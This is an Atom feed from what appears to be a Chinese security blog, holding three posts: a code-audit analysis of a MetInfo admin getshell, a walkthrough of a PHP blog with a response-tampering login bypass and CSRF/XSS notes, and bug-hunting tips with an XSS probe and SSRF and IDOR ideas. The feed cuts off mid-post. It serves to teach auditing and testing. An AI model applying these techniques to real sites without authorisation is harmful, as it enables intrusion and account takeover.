<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cai_Team</title>
  
  <subtitle>十年寒窗如一日，一举成名天下知</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="127.0.0.1/"/>
  <updated>2018-07-10T08:27:07.712Z</updated>
  <id>127.0.0.1/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计分析之metinfo后台getshell</title>
    <link href="127.0.0.1/2018/07/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%86%E6%9E%90%E4%B9%8Bmetinfo%E5%90%8E%E5%8F%B0getshell/"/>
    <id>127.0.0.1/2018/07/10/代码审计分析之metinfo后台getshell/</id>
    <published>2018-07-10T07:54:58.000Z</published>
    <updated>2018-07-10T08:27:07.712Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>并非抄袭，而是分析。</p></blockquote><a id="more"></a><p>原文地址 : <a href="http://www.91ri.org/16663.html" target="_blank" rel="noopener">http://www.91ri.org/16663.html</a></p><h3 id="第一处代码分析"><a href="#第一处代码分析" class="headerlink" title="第一处代码分析"></a>第一处代码分析</h3><p><img src="http://static.zybuluo.com/1kbfree/eh6fqqq6g9s1d7yd6cyz9wob/image_1ci1h3ar3oiqnjf26118n91e459.png" alt="image_1ci1h3ar3oiqnjf26118n91e459.png-153.2kB"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$post=<span class="keyword">array</span>(<span class="string">'ver'</span>=&gt;$metcms_v,<span class="string">'app'</span>=&gt;$applist);</span><br><span class="line">$result=curl_post($post,<span class="number">60</span>);</span><br><span class="line"><span class="keyword">if</span>(link_error($result)==<span class="number">1</span>)&#123;</span><br><span class="line">    $results=explode(<span class="string">'&lt;Met&gt;'</span>,$result); <span class="comment">//下面会讲解</span></span><br><span class="line">    file_put_contents(<span class="string">'dlappfile.php'</span>,$results[<span class="number">1</span>]); <span class="comment">//下面会讲解</span></span><br><span class="line">    file_put_contents(<span class="string">'standard.php'</span>,$results[<span class="number">0</span>].$results[<span class="number">1</span>]); <span class="comment">//下面会讲解</span></span><br></pre></td></tr></table></figure><h4 id="第四行："><a href="#第四行：" class="headerlink" title="第四行："></a>第四行：</h4><p><strong>explode函数小案例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="string">'iamfree1,iamfree2'</span>;</span><br><span class="line">var_dump( explode(<span class="string">','</span>, $str) );</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/1kbfree/x4xzr960kautsg6umbsv1a0s/image_1ci1hjfniip7dlpt4o1vmbotr36.png" alt="image_1ci1hjfniip7dlpt4o1vmbotr36.png-21.6kB"></p><p>所以<code>explode(&#39;,&#39;, $str)</code>就是将<code>$str</code>中的<code>,</code>的内容分割为出来分别放到数组里。</p><h4 id="第5-6行："><a href="#第5-6行：" class="headerlink" title="第5-6行："></a>第5-6行：</h4><p><strong>file_put_contents函数小案例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">'2018-07-10.txt'</span>, <span class="string">'iamfree'</span>); <span class="comment">// 会在当前脚本创建一个2018-07-10.txt文件，内容为iamfree</span></span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/1kbfree/2qzcul3c3hdd61jseuj9sdl0/image_1ci1i1a7v13grtgb1oeh155l18f693.png" alt="image_1ci1i1a7v13grtgb1oeh155l18f693.png-77kB"></p><h4 id="第二处代码分析："><a href="#第二处代码分析：" class="headerlink" title="第二处代码分析："></a>第二处代码分析：</h4><p><img src="http://static.zybuluo.com/1kbfree/vo05kq9qdm205fz37bk0qxz8/image_1ci1i505bbuk19eq1r6j1q5n141m9g.png" alt="image_1ci1i505bbuk19eq1r6j1q5n141m9g.png-148kB"></p><p>我做了相应的注释，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl_post</span><span class="params">($post,$timeout)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> $met_weburl,$met_host,$met_file;</span><br><span class="line">    </span><br><span class="line">    $host=$met_host;</span><br><span class="line">    $file=$met_file;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(get_extension_funcs(<span class="string">'curl'</span>)&amp;&amp;function_exists(<span class="string">'curl_init'</span>)&amp;&amp;function_exists(<span class="string">'curl_setopt'</span>)&amp;&amp;function_exists(<span class="string">'curl_exec'</span>)&amp;&amp;function_exists(<span class="string">'curl_close'</span>)) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 这个if判断是否可以用curl、curl_init、curl_setopt、curl_exec、ecurl_close，如果可用，就执行下面的操作</span></span><br><span class="line">        </span><br><span class="line">        $curlHandle=curl_init();</span><br><span class="line">        </span><br><span class="line">        curl_setopt($curlHandle,CURLOPT_URL,<span class="string">'http://'</span>.$host.$file); <span class="comment">// CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。</span></span><br><span class="line">    </span><br><span class="line">        curl_setopt($curlHandle,CURLOPT_REFERER,$met_weburl); <span class="comment">//CURLOPT_REFERER：在HTTP请求头中"Referer: "的内容。</span></span><br><span class="line">    </span><br><span class="line">        curl_setopt($curlHandle,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);<span class="comment">// CURLOPT_RETURNTRANSFER：在启用CURLOPT_RETURNTRANSFER的时候，返回原生的（Raw）输出。</span></span><br><span class="line">    </span><br><span class="line">        curl_setopt($curlHandle,CURLOPT_CONNECTTIMEOUT,$timeout); <span class="comment">//CURLOPT_CONNECTTIMEOUT：在发起连接前等待的时间，如果设置为0，则无限等待。</span></span><br><span class="line">    </span><br><span class="line">        curl_setopt($curlHandle,CURLOPT_TIMEOUT,$timeout); <span class="comment">//CURLOPT_TIMEOUT：设置cURL允许执行的最长秒数。</span></span><br><span class="line">        </span><br><span class="line">        curl_setopt($curlHandle,CURLOPT_POST, <span class="number">1</span>); <span class="comment">// CURLOPT_POST：启用时会发送一个常规的POST请求，类型为：application/x-www-form-urlencoded，就像表单提交的一样。</span></span><br><span class="line">    </span><br><span class="line">        curl_setopt($curlHandle,CURLOPT_POSTFIELDS, $post); <span class="comment">// CURLOPT_POSTFIELDS：全部数据使用HTTP协议中的"POST"操作来发送。要发送文件，在文件名前面加上@前缀并使用完整路径。这个参数可以通过urlencoded后的字符串类似'para1=val1&amp;para2=val2&amp;...'或使用一个以字段名为键值，字段数据为值的数组。如果value是一个数组，Content-Type头将会被设置成multipart/form-data</span></span><br><span class="line">    </span><br><span class="line">        $result=curl_exec($curlHandle); <span class="comment">// 执行</span></span><br><span class="line">    </span><br><span class="line">        var_dump($result);</span><br><span class="line">        curl_close($curlHandle); </span><br><span class="line">    </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/1kbfree/q38bx78ismbvvcg88b66dwa4/image_1ci1ipjoquqvs8o145f92emu0c7.png" alt="image_1ci1ipjoquqvs8o145f92emu0c7.png-356.5kB"></p><h3 id="standard-php文件的代码："><a href="#standard-php文件的代码：" class="headerlink" title="standard.php文件的代码："></a>standard.php文件的代码：</h3><p><img src="http://static.zybuluo.com/1kbfree/t4ahag9khsbq1d8o2t6z0l6b/image_1ci1ie3u4i0p3qv1a57r3a1fvibq.png" alt="image_1ci1ie3u4i0p3qv1a57r3a1fvibq.png-81.1kB"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">metinfo</span><br><span class="line"></span><br><span class="line">&lt;Met&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Joseph"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;Met&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="疑问："><a href="#疑问：" class="headerlink" title="疑问："></a>疑问：</h4><p>这里为什么要有<code>&lt;Met&gt;</code>呢？  我也不饶圈子了下面是解答</p><h4 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h4><p><img src="http://static.zybuluo.com/1kbfree/3vvvwx9n3sycn688cb9un33k/image_1ci1is5nb21ag67ge1660d4mck.png" alt="image_1ci1is5nb21ag67ge1660d4mck.png-145.8kB"></p><p>完成，下面的很简单了，不用再讲了(不要问我为什么不自己审计一个，而是去分析别人的，我是不会告诉你我审计不出漏洞的)~</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;并非抄袭，而是分析。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="Iamfree(作者)" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/Iamfree-%E4%BD%9C%E8%80%85/"/>
    
    
      <category term="代码审计" scheme="127.0.0.1/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>分析原生PHP博客-第二篇</title>
    <link href="127.0.0.1/2018/07/10/%E5%88%86%E6%9E%90%E5%8E%9F%E7%94%9FPHP%E5%8D%9A%E5%AE%A2-%E7%AC%AC%E4%BA%8C%E7%AF%87/"/>
    <id>127.0.0.1/2018/07/10/分析原生PHP博客-第二篇/</id>
    <published>2018-07-10T02:38:03.000Z</published>
    <updated>2018-07-10T08:27:01.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>这是一个<code>GITHUB</code>上找到的一个使用原生<code>PHP</code>代码写的一个博客，地址是:<code>https://github.com/qinshuang1998/Tiger-Blog</code>，但是这里有很多功能没有实现（这个作者是不是比我还懒，，，哈哈哈），然后我分析的话只是想让大家明白一下这些功能是如何实现的，还有如果有漏洞的话我也会写出来（因为我是边读边写，然后自己分析一下，但是因为我水平也不是很厉害，所以有很多漏洞也没看出来还请大佬们多多指教），对我们的代码审计有很大的帮助，不多说啦，</p><a id="more"></a><h3 id="源代码讲解"><a href="#源代码讲解" class="headerlink" title="源代码讲解"></a>源代码讲解</h3><h4 id="First、"><a href="#First、" class="headerlink" title="First、"></a>First、</h4><p>这里说明一下，我分析的时候，只会写注释，或者截屏然后在旁边标注一下，因为我觉得这样会比较高效一点，所以你们可以下载这个源代码，然后按照我分析的然后再自己看一下，大概也就能明白功能实现原理了，祝你学习愉快。</p><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><p>这个是首页文件( 废话，我也知道 )~</p><p><img src="http://static.zybuluo.com/1kbfree/y253t8g6t8ct44fjd2q1i1hp/image_1chv32k2d1s6c1dp44h57298is9.png" alt="image_1chv32k2d1s6c1dp44h57298is9.png-125.8kB"></p><h5 id="首先看第三行和第四行："><a href="#首先看第三行和第四行：" class="headerlink" title="首先看第三行和第四行："></a>首先看第三行和第四行：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(<span class="string">'./inc/conn.php'</span>); <span class="comment">// 连接数据库</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./inc/func.php'</span>); <span class="comment">// 引入函数文件(一般都是封装了常用的函数,方便调用)</span></span><br></pre></td></tr></table></figure><p>这个不必多说。</p><h5 id="接着到了第七行："><a href="#接着到了第七行：" class="headerlink" title="接着到了第七行："></a>接着到了第七行：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = $_SERVER[<span class="string">'REQUEST_URI'</span>]; <span class="comment">//这个功能我也不知道是干嘛的，我们来输出一下。</span></span><br><span class="line">var_dump( $url );<span class="keyword">die</span>; <span class="comment">//输出一下$url,并且不然他执行下面的代码</span></span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/1kbfree/5h92eelh5zlrpn3vfrakjo5c/image_1chv3750l31210tlns91rc7mlom.png" alt="image_1chv3750l31210tlns91rc7mlom.png-54.1kB"><br><img src="http://static.zybuluo.com/1kbfree/y2bzhzgo1rk1crxwyot68h9s/image_1chv37qd4bluakblkmh17k8213.png" alt="image_1chv37qd4bluakblkmh17k8213.png-57.7kB"></p><p>这个是用于输出除了域名外的路径。</p><h5 id="第8行："><a href="#第8行：" class="headerlink" title="第8行："></a>第8行：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = parse_url($url); <span class="comment">// parse_url将路径放在了数组的path，将?后面的参数放在了数组的query</span></span><br><span class="line">var_dump( $url );<span class="keyword">die</span>; <span class="comment">// 如果上面字体描述的不懂我们再来打印一下。</span></span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/1kbfree/0vzpjjzrcc43mj67svdwsnzl/image_1chv3h8iu1alr1u7b1b3015dq19u61g.png" alt="image_1chv3h8iu1alr1u7b1b3015dq19u61g.png-29.6kB"></p><p><img src="http://static.zybuluo.com/1kbfree/fzjzo21zxp86npuirk9cl3pk/php.png" alt="php.png-146.3kB"></p><h5 id="打印-num："><a href="#打印-num：" class="headerlink" title="打印$num："></a>打印$num：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump( $num );<span class="keyword">die</span>;</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/1kbfree/9vbxv83wly06fgrb5c3o01bj/image_1chv3taag1o2119grhdq1vsuos0l.png" alt="image_1chv3taag1o2119grhdq1vsuos0l.png-25.3kB"></p><p><em>这里为什么是5呢？我也好奇，然后我来到数据库看了一下。</em></p><p><img src="http://static.zybuluo.com/1kbfree/j2ua1x2o2k0y2x6nktgi7z1s/image_1chv421os1d9e1eaequa1fu61rp83f.png" alt="image_1chv421os1d9e1eaequa1fu61rp83f.png-85kB"></p><p><em>这个5就是<code>article</code>表的数量</em></p><h5 id="16-23行"><a href="#16-23行" class="headerlink" title="16-23行"></a>16-23行</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'page'</span>])&#123;</span><br><span class="line">    <span class="comment">// 把个个参数都打印一下。</span></span><br><span class="line">    $pageval=$_GET[<span class="string">'page'</span>];</span><br><span class="line">    <span class="keyword">echo</span>( <span class="string">'$pageval -&gt; '</span>.$pageval .<span class="string">"&lt;br /&gt;"</span>);</span><br><span class="line">    $page=($pageval<span class="number">-1</span>)*$pagesize;</span><br><span class="line">    <span class="keyword">echo</span>( <span class="string">'$page -&gt; '</span>.$page .<span class="string">"&lt;br /&gt;"</span>);</span><br><span class="line">    $page.=<span class="string">','</span>;</span><br><span class="line">    <span class="keyword">echo</span>( <span class="string">'$page -&gt; '</span>.$page .<span class="string">"&lt;br /&gt;"</span>);<span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/1kbfree/jjv1b3ykbxdacsy78apoiaz1/image_1chv4b03q5ps106732kps68no4s.png" alt="image_1chv4b03q5ps106732kps68no4s.png-49.1kB"></p><p><em>看不明白看下去先</em></p><p><img src="http://static.zybuluo.com/1kbfree/tlgsb75z0prxkkyspwclzfml/image_1chv4djq76svshi2s31otkm7g59.png" alt="image_1chv4djq76svshi2s31otkm7g59.png-134.4kB"></p><p><em>然后下面的就基本上是简单的<code>SQL</code>语句了，不讲解了，开始另一个文件</em></p><h4 id="admin功能"><a href="#admin功能" class="headerlink" title="admin功能"></a>admin功能</h4><p>先讲解后台功能的实现。</p><h5 id="登陆功能"><a href="#登陆功能" class="headerlink" title="登陆功能"></a>登陆功能</h5><p><img src="http://static.zybuluo.com/1kbfree/brc7ftnqs452j4xf08r6uj8j/php.png" alt="php.png-86.7kB"></p><blockquote><p>在<code>xxx/admin/login.php</code></p></blockquote><h6 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h6><p>打开后发现只有一句代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">require</span>(<span class="string">'./page/login.html'</span>); <span class="comment">// 包含当前的page文件夹里的login.html文件</span></span><br></pre></td></tr></table></figure></p><h6 id="login-html"><a href="#login-html" class="headerlink" title="login.html"></a>login.html</h6><p>打开后就是一些前端登陆的表单以及一些样式，然后他是将登陆的数据提交到<code>confirm.php</code>文件，如图：</p><p><img src="http://static.zybuluo.com/1kbfree/5l8j1c0xqox3ml672s9vuypa/image_1chv4qovjliodscff9nr61smr82.png" alt="image_1chv4qovjliodscff9nr61smr82.png-149.6kB"></p><p>表单之类的<code>html</code>代码不多讲，这里来分析一下js代码(这里有一个问授权访问漏洞，可以不输入密码直接登陆)：</p><p><img src="http://static.zybuluo.com/1kbfree/5pqcsn5zw54secwj3s3ucf92/image_1chv5gf6v1fst1gv71kj61i161p538v.png" alt="image_1chv5gf6v1fst1gv71kj61i161p538v.png-172.4kB"></p><p>然后我们来尝试登陆一下，查看<code>result</code>都会返回什么~</p><p><img src="http://static.zybuluo.com/1kbfree/ooxrb0fsh5ipc0zij5iwcbp6/image_1chv5i6ucjs1vni1vonsji1pcn9c.png" alt="image_1chv5i6ucjs1vni1vonsji1pcn9c.png-109.6kB"></p><p><em>表示登陆成功</em></p><p><img src="http://static.zybuluo.com/1kbfree/sk4m0o2rczor7msf5pdt26yv/image_1chv5innl6vj1lo54241k2v1jdo9p.png" alt="image_1chv5innl6vj1lo54241k2v1jdo9p.png-110kB"></p><p><em>表示登陆失败</em></p><p><strong>我们身为白帽子，就是用来打破这些规矩的，输入错误密码的时候我们来抓包获取返回结果并且将<code>result</code>修改为<code>success</code>~</strong></p><p><img src="http://static.zybuluo.com/1kbfree/xhumgcamh5j9uge6bj2ur0e4/php.png" alt="php.png-185.1kB"></p><p><img src="http://static.zybuluo.com/1kbfree/aif4kvy0lrvr90bdcv39pbpo/image_1chv5pvt5r761cm817v410slt023l.png" alt="image_1chv5pvt5r761cm817v410slt023l.png-95.7kB"></p><p><img src="http://static.zybuluo.com/1kbfree/76ue5oiav00tak7dvn1e077g/image_1chv5r0er6g8qe01tt81fdkhf842.png" alt="image_1chv5r0er6g8qe01tt81fdkhf842.png-90.1kB"><br><em>成功绕过</em></p><p><img src="http://static.zybuluo.com/1kbfree/twgquzlmt9muvuo9lak67i8p/image_1chv5rc1g1a5t15ef9qu1hsqcbe4f.png" alt="image_1chv5rc1g1a5t15ef9qu1hsqcbe4f.png-92.7kB"></p><p>接下来讲解一下<code>confirm.php</code>文件是如何接受数据的。</p><h6 id="confirm-php"><a href="#confirm-php" class="headerlink" title="confirm.php"></a>confirm.php</h6><p><img src="http://static.zybuluo.com/1kbfree/u0ds3ms0ocjbpibqcvyk2oi9/image_1chv6gl8n15dpns31br5p11ttf5c.png" alt="image_1chv6gl8n15dpns31br5p11ttf5c.png-178.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/hb07nekxlo0afqp3jvfma62m/image_1chv6jdc0lak1c5h1bvl1if21es37p.png" alt="image_1chv6jdc0lak1c5h1bvl1if21es37p.png-88.8kB"></p><p>上面的<code>$result</code>使用了<code>GetALL</code>函数，我们来看一下他的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetAll</span><span class="params">($query)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>($tmp = mysql_fetch_array($query))&#123;</span><br><span class="line">        $result[] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> @$result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查询<code>$query</code>这个<code>sql</code>语句执行后的数据然后循环赋值到<code>$result</code>数组里。</p><p><img src="http://static.zybuluo.com/1kbfree/2stc0xet22rj0o3ziicshqm1/image_1ci0vr2aq1udv1t4pun115fp1a6bp.png" alt="image_1ci0vr2aq1udv1t4pun115fp1a6bp.png-169.1kB"></p><p><em>这里的不多将了，具体有注释了，下面没注释的就是一些登陆操作的（我也看不懂）</em></p><h6 id="index-php-1"><a href="#index-php-1" class="headerlink" title="index.php"></a>index.php</h6><p>登陆页面分析完了，来分析一下首页页面。</p><p><img src="http://static.zybuluo.com/1kbfree/mr0s9mk7c9vjn1oi37zc3xep/image_1ci100s7mi9g14vbasa16ft1aot26.png" alt="image_1ci100s7mi9g14vbasa16ft1aot26.png-115.3kB"></p><p><strong>page文件夹里面的都是<code>html</code>文件，也就是展示页面效果的，就不多讲解了。</strong></p><h6 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h6><blockquote><p>这个文件是后台发布文章的</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/y77pa1n0wrgpus8ufy3ma3cf/image_1ci105k2r71l1k2d1na5sb11g7s2j.png" alt="image_1ci105k2r71l1k2d1na5sb11g7s2j.png-81.4kB"></p><p><img src="http://static.zybuluo.com/1kbfree/xm9ymwrgn5obbsfwyb7dsyl4/image_1ci10doif73q1vun1l5fq9a9i70.png" alt="image_1ci10doif73q1vun1l5fq9a9i70.png-180.8kB"></p><p>这里是存在<code>Csrf</code>漏洞的，而且也没有过滤<code>Xss</code>漏洞，所以是存在<code>Xsrf</code>的，但是因为这里他完成了插入功能，但是没有完成展示插入的数据的功能，所以没办法继续讲解了，等作者把功能实现了我再来具体分析。</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;这是一个&lt;code&gt;GITHUB&lt;/code&gt;上找到的一个使用原生&lt;code&gt;PHP&lt;/code&gt;代码写的一个博客，地址是:&lt;code&gt;https://github.com/qinshuang1998/Tiger-Blog&lt;/code&gt;，但是这里有很多功能没有实现（这个作者是不是比我还懒，，，哈哈哈），然后我分析的话只是想让大家明白一下这些功能是如何实现的，还有如果有漏洞的话我也会写出来（因为我是边读边写，然后自己分析一下，但是因为我水平也不是很厉害，所以有很多漏洞也没看出来还请大佬们多多指教），对我们的代码审计有很大的帮助，不多说啦，&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="127.0.0.1/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Iamfree(作者)" scheme="127.0.0.1/categories/%E7%BC%96%E7%A8%8B/Iamfree-%E4%BD%9C%E8%80%85/"/>
    
    
      <category term="PHP" scheme="127.0.0.1/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘思路总结[续]</title>
    <link href="127.0.0.1/2018/07/08/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93-%E7%BB%AD/"/>
    <id>127.0.0.1/2018/07/08/漏洞挖掘思路总结-续/</id>
    <published>2018-07-08T12:52:17.000Z</published>
    <updated>2018-07-10T08:28:33.181Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>如果你有更好的思路可以找我说一下，感激不尽~<br>后续将继续补充(前提是有思路分享给我)，还需要大佬们的多多支持~</p></blockquote><a id="more"></a><p>经过一个月的SRC挖掘，总结那么几个思路：</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>首先，比如在调用图片处，调用远程文件（修改为要访问的URL）处，或者一些IP查询的，如图</p><p><img src="http://static.zybuluo.com/1kbfree/pah66v9b293kuy2gz5xu77g4/image_1chnh3u3kvsmc6710kr1l3i1nqn19.png" alt="image_1chnh3u3kvsmc6710kr1l3i1nqn19.png-102.3kB"></p><p>上图就是百度某站点去请求输入框里面的内容，也就是<code>bbs.ixsec.org/baidu.php</code>，然后服务端就会去请求这个URL，并且将数据返回到输出的地方。</p><h3 id="Csrf"><a href="#Csrf" class="headerlink" title="Csrf"></a>Csrf</h3><p>Csrf多处存在于 修改 增加 删除 等操作中都可以尝试使用跨站请求伪造。</p><h3 id="Xss"><a href="#Xss" class="headerlink" title="Xss"></a>Xss</h3><p>1、搜索框里输入<code>&lt;img src=x onerror=alert(1)&gt;</code>，查看是否能弹窗。</p><p>2、比如某个页面评论处插入了<code>&lt;img src=x&gt;</code>被实体编码的话，假设当前的网站有一个引用功能，那么我们就可以引用一下这个评论，如果在引用页面没有实体化编码的话，那么就会存在二次Xss漏洞攻击。</p><p>3、比如某些网站在评论后会显示 IP 或者 来源（电脑、手机、苹果之类的），如果是可控的话我们可以修改为恶意的<code>JS</code>代码，因为很少开发者会把这些地方选择实体化编码。</p><p>4、总结就是有框就插，没实体输出的话就干，没实体输出的话就选择去绕过~</p><h3 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h3><p>我也不太会，不写了</p><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p>1、普遍创建<code>2</code>个账号，然后将 2 个账号中统一操作的数据包复制下来，慢慢的进行分析，查看是否有身份标识是可控的。</p><p>2、某些网站的ID是非常的长的，但是如果是有规则的话还是可以分析出来的，如下案例：</p><p>iamfree账号的ID：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2018666iamfreeabcbcaabcbca66612</span><br></pre></td></tr></table></figure><p>hack账户的ID：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2018666hackabcbcaabcbca66676</span><br></pre></td></tr></table></figure><p>提取下来分析，这个案例很简单，有眼睛都看得出来只有中间的和最后面的不同，而中间不同处是用户的名称，而后面二位不同的话是可以爆破的，毕竟才二位。</p><h3 id="任意用户操作（如注册，重置等）"><a href="#任意用户操作（如注册，重置等）" class="headerlink" title="任意用户操作（如注册，重置等）"></a>任意用户操作（如注册，重置等）</h3><blockquote><p>此漏洞一般都是处于<strong>忘记密码处和注册处</strong></p></blockquote><h4 id="手机号码找回"><a href="#手机号码找回" class="headerlink" 